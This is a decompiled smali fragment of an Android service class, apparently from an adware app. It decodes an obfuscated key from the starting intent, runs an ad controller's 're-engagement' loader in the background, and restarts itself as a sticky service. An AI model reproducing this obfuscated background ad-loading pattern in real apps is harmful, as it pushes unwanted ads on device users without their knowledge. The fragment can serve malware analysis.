.class public Lcom/ievyhrdnoniovof/AdBootReceiverService;
.super Landroid/app/Service;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method private synthetic l(Landroid/content/Intent;)V
    .locals 3
    .param p1, "arg0"    # Landroid/content/Intent;

    .prologue
    if-eqz p1, :cond_0

    :try_start_0
    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "\"B2S8H?N5"

    invoke-static {v1}, Lcom/ievyhrdnoniovof/AdWakeLock;->l(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Lcom/ievyhrdnoniovof/AdController;

    invoke-virtual {p0}, Lcom/ievyhrdnoniovof/AdBootReceiverService;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-direct {v1, v2, v0}, Lcom/ievyhrdnoniovof/AdController;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    invoke-virtual {v1}, Lcom/ievyhrdnoniovof/AdController;->loadReEngagement()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "arg0"    # Landroid/content/Intent;

    .prologue
    const/4 v0, 0x0

    return-object v0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1
    .param p1, "arg0"    # Landroid/content/Intent;
    .param p2, "arg1"    # I
    .param p3, "arg2"    # I

    .prologue
    const/4 v0, 0x1

    invoke-direct {p0, p1}, Lcom/ievyhrdnoniovof/AdBootReceiverService;->l(Landroid/content/Intent;)V

    return v0
.end method
